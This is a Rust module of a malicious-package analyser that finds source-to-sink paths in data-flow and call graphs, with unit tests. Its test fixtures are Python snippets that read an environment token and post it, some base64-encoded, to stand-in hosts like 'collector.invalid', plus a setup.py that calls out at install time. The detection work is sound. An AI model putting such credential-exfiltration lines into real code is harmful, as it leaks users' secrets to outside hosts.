//! Source→sink reachability: the decision predicate of the whole analyser
//! (invariant 3; DECISIONS.md, ADR-008 and ADR-009).
//!
//! Two kinds of query, both returning `ReachabilityPath`s:
//! - `data_paths`: a path in the data-flow graph from a source's result node to a sink's
//!   argument node;
//! - `control_paths`: a path in the call graph from a phase root to the definition that
//!   contains a sink call.
//!
//! Determinism: sources, sinks and the resulting paths are produced in canonical order
//! (file, then span), and for each (source, sink) pair the *shortest* path is chosen
//! (BFS), ties broken by node index. Two scans of the same bytes yield identical paths.

use std::collections::{BTreeMap, BTreeSet, VecDeque};

use petgraph::Direction;
use petgraph::graph::{EdgeIndex, NodeIndex};
use petgraph::visit::EdgeRef;
use phylaxis_core::{
    Confidence, FileId, FlowEdgeKind, FlowNodeKind, Location, PackageGraph, PathStep, PathStepKind,
    PhaseRoot, QualifiedName, ReachabilityKind, ReachabilityPath, Span, SymbolKind, TaintSink,
    TaintSinkKind, TaintSource, TaintSourceKind,
};

/// A catalogue source pattern: a kind plus a canonical dotted-name prefix (for calls) or
/// a path prefix (for `SensitiveFile`, matched against string literals passed to file
/// APIs). Defined here, below the rules crate, so that both crates share one type.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SourcePattern {
    pub kind: TaintSourceKind,
    pub pattern: &'static str,
}

/// A catalogue sink pattern: a kind plus a canonical dotted-name prefix, and which
/// argument position carries the dangerous value (`None` = any argument or the receiver).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SinkPattern {
    pub kind: TaintSinkKind,
    pub pattern: &'static str,
    pub arg: Option<usize>,
}

/// Search bounds. WHY bounded: a hostile package can contain a pathological graph; the
/// scan must finish, and a truncated search is recorded, not hidden.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ReachLimits {
    pub max_depth: usize,
    pub max_paths_per_pair: usize,
}

impl Default for ReachLimits {
    fn default() -> Self {
        Self {
            max_depth: 64,
            max_paths_per_pair: 1,
        }
    }
}

/// Finds every occurrence of the given source patterns in the package graph, in canonical
/// order (file, then span, then node index).
///
/// - Name-based kinds (`Environment`, `SystemIdentity`, `UserInput`, `NetworkResponse`)
///   match a `CallResult` whose canonical callee `is_under` the pattern (`os.getenv(…)`),
///   or a read of an imported name under it (`os.environ` in `os.environ['T']`). A read
///   only counts when nothing flows into its node: that is what an external read looks like
///   in this graph, and it keeps `os.environ['T']` — a `Container` step fed by the read —
///   from being counted a second time.
/// - `PhaseRoot` yields one source per root in `pg.phases.roots`; its `node` is the root's
///   **call-graph** node, which is why `data_paths` skips it.
/// - `SensitiveFile`, `DecodedLiteral` and `SuspiciousLiteral` need the value of a literal
///   argument, not a name, and are **not matched yet**: they yield nothing. The literal is
///   already in the graph (a `Literal` node's label is its value); the matching belongs to
///   the rule catalogue's block and is recorded as an open request in DECISIONS.md.
pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintSource> {
    let d = &pg.dfg.graph;
    let mut out = Vec::new();
    for p in patterns {
        match p.kind {
            TaintSourceKind::PhaseRoot => {
                for root in &pg.phases.roots {
                    let (Some(node), Some(sym)) = (
                        pg.call_graph.node_of(root.symbol),
                        pg.symbols.get(root.symbol),
                    ) else {
                        continue;
                    };
                    out.push(TaintSource {
                        kind: p.kind,
                        pattern: QualifiedName::new(p.pattern),
                        location: location(pg, root.file, sym.defined_at.unwrap_or_default()),
                        node,
                    });
                }
            }
            TaintSourceKind::SensitiveFile
            | TaintSourceKind::DecodedLiteral
            | TaintSourceKind::SuspiciousLiteral => {}
            _ => {
                for i in d.node_indices() {
                    let n = &d[i];
                    let matches = match n.kind {
                        FlowNodeKind::CallResult => true,
                        FlowNodeKind::Use => d
                            .neighbors_directed(i, Direction::Incoming)
                            .next()
                            .is_none(),
                        _ => false,
                    } && QualifiedName::new(n.label.as_str()).is_under(p.pattern);
                    if matches {
                        out.push(TaintSource {
                            kind: p.kind,
                            pattern: QualifiedName::new(p.pattern),
                            location: location(pg, n.file, n.span),
                            node: i,
                        });
                    }
                }
            }
        }
    }
    out.sort_by(|a, b| (&a.location, a.node, a.kind).cmp(&(&b.location, b.node, b.kind)));
    out.dedup_by(|a, b| a.node == b.node && a.kind == b.kind);
    out
}

/// Finds every sink occurrence, in canonical order: a call whose canonical callee
/// `is_under` a pattern.
///
/// The returned `node` is the call's **external-parameter node** — the one `Parameter`
/// node the data-flow builder gives every call to a non-preserving external, into which
/// all of the call's arguments and its receiver flow (see `dataflow::build_data_flow`).
/// `definition` is the call-graph node of the definition containing the call.
///
/// `SinkPattern::arg` is not yet honoured: every argument counts. That errs toward a
/// finding, as ADR-007 asks of the graph; narrowing it needs one parameter node per
/// argument position.
pub fn find_sinks(pg: &PackageGraph, patterns: &[SinkPattern]) -> Vec<TaintSink> {
    let d = &pg.dfg.graph;
    let mut out = Vec::new();
    for i in d.node_indices() {
        let n = &d[i];
        if n.kind != FlowNodeKind::Parameter {
            continue;
        }
        // A package function's parameters carry no symbol; only the external stand-ins do.
        let Some(callee) = n.symbol.and_then(|s| pg.symbols.get(s)) else {
            continue;
        };
        if callee.kind != SymbolKind::External {
            continue;
        }
        let Some(definition) = pg.call_graph.node_of(n.owner) else {
            continue;
        };
        for p in patterns
            .iter()
            .filter(|p| callee.qualified.is_under(p.pattern))
        {
            out.push(TaintSink {
                kind: p.kind,
                pattern: QualifiedName::new(p.pattern),
                location: location(pg, n.file, n.span),
                node: i,
                definition,
            });
        }
    }
    out.sort_by(|a, b| (&a.location, a.node, a.kind).cmp(&(&b.location, b.node, b.kind)));
    out.dedup_by(|a, b| a.node == b.node && a.kind == b.kind);
    out
}

/// Data reachability. For each (source, sink) pair in canonical order, the shortest path
/// in the DFG from `source.node` to `sink.node` of at most `limits.max_depth` edges. Each
/// path's `confidence` is the minimum edge confidence, and `obfuscated` is set if any
/// `Transform { obfuscating: true }` edge was crossed.
///
/// `conditional` is always `false` for now: deciding it needs the syntax around the sink
/// (`if platform.system() == …`), which the package graph does not carry. It is a severity
/// attribute, not part of the predicate, so its absence moves no path in or out.
///
/// At most one path per pair is emitted, whatever `max_paths_per_pair` says.
pub fn data_paths(
    pg: &PackageGraph,
    sources: &[TaintSource],
    sinks: &[TaintSink],
    limits: &ReachLimits,
) -> Vec<ReachabilityPath> {
    // EXPLAIN(opus): breadth-first search from each source, keeping for every reached node
    // the edge it was first reached by (`parent`). Walking `parent` back from a sink gives
    // the path. BFS reaches each node first along a path with the fewest edges, so that
    // path is the shortest one, and ties are broken by visiting out-edges in target-index
    // order — which makes the choice a function of the graph alone (ADR-004).
    //
    // WHY one path and not all of them: the number of simple paths between two nodes grows
    // exponentially with the graph (a chain of n diamonds has 2^n), and the graph is
    // written by the attacker. The rule needs to know that *a* path exists, and the auditor
    // needs one readable path to confirm or refute it; the shortest is the most readable.
    // One BFS per source serves every sink, so the cost is O(sources × edges).
    let d = &pg.dfg.graph;
    let mut out = Vec::new();
    if limits.max_paths_per_pair == 0 {
        return out;
    }
    for source in sources {
        if source.kind == TaintSourceKind::PhaseRoot || d.node_weight(source.node).is_none() {
            continue;
        }
        let parent = bfs(source.node, limits.max_depth, |n| {
            let mut next: Vec<(NodeIndex, EdgeIndex)> = d
                .edges_directed(n, Direction::Outgoing)
                .map(|e| (e.target(), e.id()))
                .collect();
            next.sort();
            next
        });
        for sink in sinks {
            let Some(edges) = walk_back(&parent, source.node, sink.node, |e| {
                d.edge_endpoints(e).map(|(from, _)| from)
            }) else {
                continue;
            };
            out.push(data_path(pg, source, sink, &edges));
        }
    }
    out
}

/// Control reachability. BFS in the call graph from `root.symbol`'s node to each sink's
/// `definition` node; the path's steps are `Source` (the root), one `Call` per edge, then
/// `Sink` (the sink call itself). Confidence is the minimum call-edge confidence.
pub fn control_paths(
    pg: &PackageGraph,
    root: &PhaseRoot,
    sinks: &[TaintSink],
    limits: &ReachLimits,
) -> Vec<ReachabilityPath> {
    let cg = &pg.call_graph.graph;
    let mut out = Vec::new();
    let Some(start) = pg.call_graph.node_of(root.symbol) else {
        return out;
    };
    if limits.max_paths_per_pair == 0 {
        return out;
    }
    let parent = bfs(start, limits.max_depth, |n| {
        let mut next: Vec<(NodeIndex, EdgeIndex)> = cg
            .edges_directed(n, Direction::Outgoing)
            .map(|e| (e.target(), e.id()))
            .collect();
        next.sort();
        next
    });
    let root_span = pg
        .symbols
        .get(root.symbol)
        .and_then(|s| s.defined_at)
        .unwrap_or_default();
    for sink in sinks {
        let Some(edges) = walk_back(&parent, start, sink.definition, |e| {
            cg.edge_endpoints(e).map(|(from, _)| from)
        }) else {
            continue;
        };
        let mut steps = vec![PathStep {
            kind: PathStepKind::Source,
            location: location(pg, root.file, root_span),
            symbol: cg[start].name.to_string(),
            detail: Some(format!("{:?} root", root.phase)),
        }];
        let mut confidence = Confidence::Resolved;
        for e in &edges {
            let w = &cg[*e];
            let (_, to) = cg.edge_endpoints(*e).expect("edge from this graph");
            confidence = confidence.min(w.confidence);
            steps.push(PathStep {
                kind: PathStepKind::Call,
                location: location(pg, w.file, w.site),
                symbol: cg[to].name.to_string(),
                detail: None,
            });
        }
        steps.push(PathStep {
            kind: PathStepKind::Sink,
            location: sink.location.clone(),
            symbol: sink.pattern.to_string(),
            detail: None,
        });
        out.push(ReachabilityPath {
            kind: ReachabilityKind::Control,
            steps,
            confidence,
            obfuscated: false,
            conditional: false,
        });
    }
    out
}

/// Breadth-first search from `start`, at most `max_depth` edges deep. Returns, for every
/// node reached other than `start`, the edge it was first reached by.
fn bfs(
    start: NodeIndex,
    max_depth: usize,
    mut next: impl FnMut(NodeIndex) -> Vec<(NodeIndex, EdgeIndex)>,
) -> BTreeMap<NodeIndex, EdgeIndex> {
    let mut parent = BTreeMap::new();
    let mut seen = BTreeSet::from([start]);
    let mut frontier = VecDeque::from([(start, 0usize)]);
    while let Some((node, depth)) = frontier.pop_front() {
        if depth == max_depth {
            continue;
        }
        for (to, edge) in next(node) {
            if seen.insert(to) {
                parent.insert(to, edge);
                frontier.push_back((to, depth + 1));
            }
        }
    }
    parent
}

/// The edges from `start` to `goal`, in order, if the search reached `goal`. A `goal`
/// equal to `start` is a path of no edges.
fn walk_back(
    parent: &BTreeMap<NodeIndex, EdgeIndex>,
    start: NodeIndex,
    goal: NodeIndex,
    source_of: impl Fn(EdgeIndex) -> Option<NodeIndex>,
) -> Option<Vec<EdgeIndex>> {
    let mut edges = Vec::new();
    let mut at = goal;
    while at != start {
        let e = *parent.get(&at)?;
        edges.push(e);
        at = source_of(e)?;
    }
    edges.reverse();
    Some(edges)
}

/// Turns the edges of a data path into typed steps (ADR-009).
fn data_path(
    pg: &PackageGraph,
    source: &TaintSource,
    sink: &TaintSink,
    edges: &[EdgeIndex],
) -> ReachabilityPath {
    let d = &pg.dfg.graph;
    let first = &d[source.node];
    let mut steps = vec![PathStep {
        kind: PathStepKind::Source,
        location: source.location.clone(),
        symbol: first.label.clone(),
        detail: Some(source.pattern.to_string()),
    }];
    let mut confidence = Confidence::Resolved;
    let mut obfuscated = false;
    for e in edges {
        let w = &d[*e];
        let (_, to) = d.edge_endpoints(*e).expect("edge from this graph");
        confidence = confidence.min(w.confidence);
        let (kind, detail) = match &w.kind {
            FlowEdgeKind::Assign | FlowEdgeKind::Container | FlowEdgeKind::Attribute => {
                (PathStepKind::Transfer, None)
            }
            FlowEdgeKind::Argument => (PathStepKind::Call, None),
            FlowEdgeKind::Return => (PathStepKind::Return, None),
            FlowEdgeKind::Transform {
                callee,
                obfuscating,
            } => {
                obfuscated |= *obfuscating;
                (PathStepKind::Transform, Some(callee.to_string()))
            }
        };
        let n = &d[to];
        steps.push(PathStep {
            kind,
            location: location(pg, n.file, n.span),
            symbol: n.label.clone(),
            detail,
        });
    }
    // The last edge enters the sink's parameter node; that step *is* the sink.
    let sink_step = PathStep {
        kind: PathStepKind::Sink,
        location: sink.location.clone(),
        symbol: sink.pattern.to_string(),
        detail: None,
    };
    if steps.len() > 1 {
        *steps.last_mut().expect("non-empty") = sink_step;
    } else {
        steps.push(sink_step);
    }
    ReachabilityPath {
        kind: ReachabilityKind::Data,
        steps,
        confidence,
        obfuscated,
        conditional: false,
    }
}

fn location(pg: &PackageGraph, file: FileId, span: Span) -> Location {
    Location {
        file,
        path: pg.file_path(file).unwrap_or_default().to_owned(),
        span,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_support::graph_from_sources;
    use phylaxis_core::{Confidence, PathStepKind, ReachabilityKind};

    const ENV: &[SourcePattern] = &[SourcePattern {
        kind: TaintSourceKind::Environment,
        pattern: "os.environ",
    }];
    const POST: &[SinkPattern] = &[SinkPattern {
        kind: TaintSinkKind::NetworkEgress,
        pattern: "requests.post",
        arg: None,
    }];

    fn paths(src: &str) -> (Vec<TaintSource>, Vec<TaintSink>, Vec<ReachabilityPath>) {
        let g = graph_from_sources(&[("pkg/a.py", src)]);
        let sources = find_sources(&g, ENV);
        let sinks = find_sinks(&g, POST);
        let p = data_paths(&g, &sources, &sinks, &ReachLimits::default());
        (sources, sinks, p)
    }

    // ── THE NOVELTY PAIR ────────────────────────────────────────────────────────────
    // These two tests are the executable form of the thesis contribution: reachability,
    // not co-occurrence (CLAUDE.md, invariant 3). They differ in exactly one token: whether the
    // value read from the environment is the value that is sent. Both files contain an
    // environment read and a network write; a co-occurrence tool flags both. Only the
    // first contains a path. Do not rename these two: they are cited by name elsewhere.

    /// A source→sink path exists: the environment value flows into the request body.
    #[test]
    fn reachability_finds_env_to_network_path() {
        let (sources, sinks, p) = paths(
            "import os\nimport requests\n\ntoken = os.environ['TOKEN']\nrequests.post('https://collector.invalid/', data=token)\n",
        );
        assert_eq!(sources.len(), 1);
        assert_eq!(sinks.len(), 1);
        assert_eq!(p.len(), 1, "exactly one path: env → token → post");
        let path = &p[0];
        assert_eq!(path.kind, ReachabilityKind::Data);
        assert_eq!(path.steps.first().unwrap().kind, PathStepKind::Source);
        assert_eq!(path.steps.last().unwrap().kind, PathStepKind::Sink);
        assert_eq!(path.confidence, Confidence::Resolved);
        assert!(!path.obfuscated);
    }

    /// The same source and the same sink in the same file, but the value sent is a
    /// constant: no path, therefore no finding. Co-occurrence alone is not evidence.
    #[test]
    fn cooccurrence_without_flow_yields_no_path() {
        let (sources, sinks, p) = paths(
            "import os\nimport requests\n\ntoken = os.environ['TOKEN']\nrequests.post('https://collector.invalid/', data='static')\n",
        );
        assert_eq!(sources.len(), 1, "the source IS present");
        assert_eq!(sinks.len(), 1, "the sink IS present");
        assert!(p.is_empty(), "but nothing flows between them");
    }
    // ────────────────────────────────────────────────────────────────────────────────

    // The path survives an interprocedural hop and a taint-preserving transform, and the
    // transform marks it obfuscated.
    #[test]
    fn path_crosses_function_boundary_and_encoder() {
        let (_, _, p) = paths(
            "import os, base64, requests\n\ndef wrap(v):\n    return base64.b64encode(v.encode())\n\ndef send(payload):\n    requests.post('https://c.invalid/', data=payload)\n\nsend(wrap(os.environ['TOKEN']))\n",
        );
        assert_eq!(p.len(), 1);
        assert!(p[0].obfuscated);
        assert!(p[0].steps.iter().any(|s| s.kind == PathStepKind::Transform));
        assert!(p[0].steps.iter().any(|s| s.kind == PathStepKind::Call));
    }

    // A non-preserving call between source and sink breaks the path (ADR-006).
    #[test]
    fn non_preserving_call_breaks_the_path() {
        let (_, _, p) = paths(
            "import os, requests\nn = len(os.environ['TOKEN'])\nrequests.post('https://c.invalid/', data=n)\n",
        );
        assert!(p.is_empty());
    }

    // Ambiguous resolution lowers the path's confidence but keeps the path (ADR-007).
    #[test]
    fn ambiguous_edge_lowers_confidence_but_keeps_path() {
        let (_, _, p) = paths(
            "import os, requests\nclass S:\n    def send(self, v):\n        requests.post('https://c.invalid/', data=v)\ndef go(obj):\n    obj.send(os.environ['TOKEN'])\n",
        );
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].confidence, Confidence::Ambiguous);
    }

    // Determinism: identical inputs yield identical paths, step for step.
    #[test]
    fn paths_are_deterministic() {
        let src = "import os, requests\na = os.environ['A']\nb = os.environ['B']\nrequests.post('https://c.invalid/', data=a)\nrequests.post('https://c.invalid/', data=b)\n";
        let (_, _, p1) = paths(src);
        let (_, _, p2) = paths(src);
        assert_eq!(p1, p2);
        assert_eq!(p1.len(), 2);
    }

    // Control reachability: from the install root to a network sink through a helper.
    #[test]
    fn control_path_from_install_root_to_sink() {
        let g = graph_from_sources(&[(
            "setup.py",
            "import urllib.request\ndef fetch():\n    urllib.request.urlopen('https://c.invalid/')\nfetch()\n",
        )]);
        let sinks = find_sinks(
            &g,
            &[SinkPattern {
                kind: TaintSinkKind::NetworkEgress,
                pattern: "urllib.request.urlopen",
                arg: None,
            }],
        );
        let root = g
            .phases
            .roots
            .iter()
            .find(|r| r.phase == phylaxis_core::ExecutionPhase::Install)
            .expect("install root");
        let p = control_paths(&g, root, &sinks, &ReachLimits::default());
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].kind, ReachabilityKind::Control);
        assert_eq!(p[0].steps.first().unwrap().kind, PathStepKind::Source);
        assert!(p[0].steps.iter().any(|s| s.kind == PathStepKind::Call));
        assert_eq!(p[0].steps.last().unwrap().kind, PathStepKind::Sink);
    }

    // The depth bound truncates rather than hangs.
    #[test]
    fn depth_limit_is_respected() {
        let (_, _, p) = paths(
            "import os, requests\nv = os.environ['T']\nfor _ in range(3):\n    v = v + 'x'\nrequests.post('https://c.invalid/', data=v)\n",
        );
        assert_eq!(p.len(), 1);
        let g = graph_from_sources(&[(
            "pkg/a.py",
            "import os, requests\nv = os.environ['T']\nv = v + 'x'\nv = v + 'y'\nrequests.post('https://c.invalid/', data=v)\n",
        )]);
        let s = find_sources(&g, ENV);
        let k = find_sinks(&g, POST);
        let tight = data_paths(
            &g,
            &s,
            &k,
            &ReachLimits {
                max_depth: 1,
                max_paths_per_pair: 1,
            },
        );
        assert!(
            tight.is_empty(),
            "a depth limit of 1 cannot reach through two assignments"
        );
    }
}
